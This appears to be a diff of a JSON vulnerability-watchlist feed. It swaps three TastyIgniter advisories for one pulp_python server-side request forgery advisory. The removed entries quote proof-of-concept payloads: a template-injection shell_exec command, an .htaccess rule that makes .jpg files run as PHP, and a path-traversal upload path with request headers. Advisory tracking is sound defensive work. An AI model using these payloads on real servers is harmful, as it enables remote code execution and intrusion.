@@ -1,137 +1,45 @@
 {
   "alerts": [
     {
-      "affected": [
-        "tastyigniter/tastyigniter"
-      ],
+      "affected": [],
       "aliases": [
-        "CVE-2026-69178",
-        "GHSA-743w-g9pf-8p94"
+        "CVE-2026-126984",
+        "GHSA-x4cr-9jx8-g6ff"
       ],
       "attention_score": 75,
       "categories": [
-        "applications",
+        "dependencies",
         "infrastructure"
       ],
-      "cvss": 9.1,
+      "cvss": 10.0,
       "cvss_version": "3.1",
-      "ecosystems": [
-        "composer"
-      ],
+      "ecosystems": [],
       "exploited": false,
       "exposure": "not assessed",
-      "first_seen": "2026-11-26T08:18:31Z",
-      "id": "CVE-2026-69178",
-      "last_seen": "2026-11-26T08:18:31Z",
+      "first_seen": "2026-11-26T21:33:00Z",
+      "id": "CVE-2026-126984",
+      "last_seen": "2026-11-26T21:33:00Z",
       "matched_topics": [
-        "Linux"
+        "Python"
       ],
-      "modified": "2026-11-25T22:24:14Z",
+      "modified": "2026-11-26T18:30:34Z",
       "priority": "review",
-      "published": "2026-11-25T22:24:13Z",
-      "security_topics": [
-        "Remote code execution"
-      ],
-      "severity": "critical",
-      "sources": [
-        {
-          "name": "GitHub Advisory Database",
-          "url": "https://github.com/advisories/GHSA-743w-g9pf-8p94"
-        }
-      ],
-      "suggested_next_step": "Check whether the named product and affected versions are in use; follow the original vendor's remediation guidance.",
-      "summary": "### Summary **Where:** `POST /admin/mail_templates/edit/{id}` → body field **Who can trigger:** Any admin user with `Admin.MailTemplates` permission **Impact:** Arbitrary PHP execution on the server  -  full RCE ### Details The Mail templates is vulnerable to SSTI and did not perform an validation and sanitization. ### PoC - login as admin - create new mail template with following command ``` @php echo shell_exec('echo \"RCE Executed\";id'); @endphp ``` - save the request - execute the request using `X-IGNITER-REQUEST-HANDLER: onTestTemplate` Request ```http POST /admin/mail_templates/edit/20 HTTP/1.1 Host: localhost:8888 Content-Length: 47 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 sec-ch-ua-platform: \"Linux\" X-CSRF-TOKEN: L22Pxu6L5hHmHgoC4RB1Zz5Py16muXvsRIOBtxuY Accept-Language: en-US,en;q=0.9 sec-ch-ua: \"Not-A.Brand\";v",
-      "title": "TastyIgniter mail template editor allows remote code execution via server-side template injection",
-      "why_it_matters": "### Summary **Where:** `POST /admin/mail_templates/edit/{id}` → body field **Who can trigger:** Any admin user with `Admin.MailTemplates` permission **Impact:** Arbitrary PHP execution on the server  -  full RCE ### Details The Mail templates is vulnerable to SSTI and did not perform an validation and sanitization. ### PoC - login as admin - create new mail template with following command ``` @php echo shell_exec('echo \"RCE Executed\";id'); @endphp ``` - save the request - execute the request using `X-IGNITER-REQUEST-HANDLER: onTestTemplate` Request ```http POST /admin/mail_templates/edit/20 HTTP/1.1 Host: localhost:8888 Content-Length: 47 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 sec-ch-ua-platform: \"Linux\" X-CSRF-TOKEN: L22Pxu6L5hHmHgoC4RB1Zz5Py16muXvsRIOBtxuY Accept-Language: en-US,en;q=0.9 sec-ch-ua: \"Not-A.Brand\";v"
-    },
-    {
-      "affected": [
-        "tastyigniter/tastyigniter"
-      ],
-      "aliases": [
-        "CVE-2026-69179",
-        "GHSA-7wwv-x6mc-pxqx"
-      ],
-      "attention_score": 75,
-      "categories": [
-        "applications",
-        "infrastructure"
-      ],
-      "cvss": 9.1,
-      "cvss_version": "3.1",
-      "ecosystems": [
-        "composer"
-      ],
-      "exploited": false,
-      "exposure": "not assessed",
-      "first_seen": "2026-11-26T08:18:31Z",
-      "id": "CVE-2026-69179",
-      "last_seen": "2026-11-26T08:18:31Z",
-      "matched_topics": [
-        "Linux"
-      ],
-      "modified": "2026-11-25T22:24:37Z",
-      "priority": "review",
-      "published": "2026-11-25T22:24:36Z",
-      "security_topics": [
-        "Remote code execution"
-      ],
-      "severity": "critical",
-      "sources": [
-        {
-          "name": "GitHub Advisory Database",
-          "url": "https://github.com/advisories/GHSA-7wwv-x6mc-pxqx"
-        }
-      ],
-      "suggested_next_step": "Check whether the named product and affected versions are in use; follow the original vendor's remediation guidance.",
-      "summary": "### Summary Media manager accepts `.htaccess` file which can be used to perform RCE. ### Details The file upload functionality from media manager somehow accepts `.htaccess` file. This file could be used to allow any extension to run PHP command. By doing so, it is possible to perform RCE. ### PoC - Login as Admin - Create a `.htaccess` file with the following code. ``` <FilesMatch \"\\.jpg$\"> SetHandler application/x-httpd-php </FilesMatch> ``` - Upload the `.htaccess` file via the Media Manager. Request ``` POST /admin/media_manager HTTP/1.1 Host: localhost:8888 Content-Length: 357 sec-ch-ua-platform: \"Linux\" X-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx Cache-Control: no-cache Accept-Language: en-US,en;q=0.9 sec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\" sec-ch-ua-mobile: ?0 X-IGNITER-FILEUPLOAD: mediamanager X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (X11; L",
-      "title": "TastyIgniter allows Remote Code Execution (RCE) via Unrestricted file upload in Media Manager",
-      "why_it_matters": "### Summary Media manager accepts `.htaccess` file which can be used to perform RCE. ### Details The file upload functionality from media manager somehow accepts `.htaccess` file. This file could be used to allow any extension to run PHP command. By doing so, it is possible to perform RCE. ### PoC - Login as Admin - Create a `.htaccess` file with the following code. ``` <FilesMatch \"\\.jpg$\"> SetHandler application/x-httpd-php </FilesMatch> ``` - Upload the `.htaccess` file via the Media Manager. Request ``` POST /admin/media_manager HTTP/1.1 Host: localhost:8888 Content-Length: 357 sec-ch-ua-platform: \"Linux\" X-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx Cache-Control: no-cache Accept-Language: en-US,en;q=0.9 sec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\" sec-ch-ua-mobile: ?0 X-IGNITER-FILEUPLOAD: mediamanager X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (X11; L"
-    },
-    {
-      "affected": [
-        "tastyigniter/tastyigniter"
-      ],
-      "aliases": [
-        "CVE-2026-69181",
-        "GHSA-rj59-9f77-mvg5"
-      ],
-      "attention_score": 55,
-      "categories": [
-        "applications",
-        "infrastructure"
-      ],
-      "cvss": 7.6,
-      "cvss_version": "3.1",
-      "ecosystems": [
-        "composer"
-      ],
-      "exploited": false,
-      "exposure": "not assessed",
-      "first_seen": "2026-11-26T08:18:31Z",
-      "id": "CVE-2026-69181",
-      "last_seen": "2026-11-26T08:18:31Z",
-      "matched_topics": [
-        "Linux"
-      ],
-      "modified": "2026-11-25T22:54:30Z",
-      "priority": "review",
-      "published": "2026-11-25T22:54:30Z",
+      "published": "2026-11-26T18:30:26Z",
       "security_topics": [],
-      "severity": "high",
+      "severity": "critical",
       "sources": [
         {
           "name": "GitHub Advisory Database",
-          "url": "https://github.com/advisories/GHSA-rj59-9f77-mvg5"
+          "url": "https://github.com/advisories/GHSA-x4cr-9jx8-g6ff"
         }
       ],
-      "suggested_next_step": "Check whether the named product and affected versions are in use; follow the original vendor's remediation guidance.",
-      "summary": "### Summary Arbitrary file write outside `media/uploads/` ### Details It is possible to perform Path Traversal in Media Manager file upload function as admin. ### PoC - login as admin - upload a image but in the request, change the path from `/` to `/../../`. Request ```http POST /admin/media_manager HTTP/1.1 Host: localhost:8888 Content-Length: 302 sec-ch-ua-platform: \"Linux\" X-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx Cache-Control: no-cache Accept-Language: en-US,en;q=0.9 sec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\" sec-ch-ua-mobile: ?0 X-IGNITER-FILEUPLOAD: mediamanager X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Accept: application/json Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE Origin: http://localhost:8888 Sec-Fetch-Site: ",
-      "title": "TastyIgniter permits Path Traversal in Media Upload",
-      "why_it_matters": "### Summary Arbitrary file write outside `media/uploads/` ### Details It is possible to perform Path Traversal in Media Manager file upload function as admin. ### PoC - login as admin - upload a image but in the request, change the path from `/` to `/../../`. Request ```http POST /admin/media_manager HTTP/1.1 Host: localhost:8888 Content-Length: 302 sec-ch-ua-platform: \"Linux\" X-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx Cache-Control: no-cache Accept-Language: en-US,en;q=0.9 sec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\" sec-ch-ua-mobile: ?0 X-IGNITER-FILEUPLOAD: mediamanager X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Accept: application/json Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE Origin: http://localhost:8888 Sec-Fetch-Site: "
+      "suggested_next_step": "Check whether affected package versions are present in your dependencies and review the maintainer's fix guidance.",
+      "summary": "A **server-side request forgery** flaw has been found in the get_remote_artifact_url() function in pulp_python/app/models.py of the pull-through caching feature in the **pulp_python** package. The function uses the redirect query parameter from the client request as the URL to download. A network attacker or user who can reach the content app of a Python distribution that has a remote can choose that URL. The content app downloads it and returns the response. When the remote has a username and password, the download sends those credentials to the host in the URL. When the remote policy is immediate, the default, or on_demand, the file is saved into the distribution's repository and later clients are served that file. The project name and version come from the file, and the filename comes from the request path. A filename the repository already stores is served from the stored file.",
+      "title": "A **server-side request forgery** flaw has been found in the get_remote_artifact_url() function...",
+      "why_it_matters": "A **server-side request forgery** flaw has been found in the get_remote_artifact_url() function in pulp_python/app/models.py of the pull-through caching feature in the **pulp_python** package. The function uses the redirect query parameter from the client request as the URL to download. A network attacker or user who can reach the content app of a Python distribution that has a remote can choose that URL. The content app downloads it and returns the response. When the remote has a username and password, the download sends those credentials to the host in the URL. When the remote policy is immediate, the default, or on_demand, the file is saved into the distribution's repository and later clients are served that file. The project name and version come from the file, and the filename comes from the request path. A filename the repository already stores is served from the stored file."
     }
   ],
-  "generated_at": "2026-11-26T08:18:31Z",
+  "generated_at": "2026-11-26T21:33:00Z",
   "initial_baseline": false,
   "note": "Newly published watchlist matches only; older updated advisories stay in the archive. Local exposure is not assessed."
 }
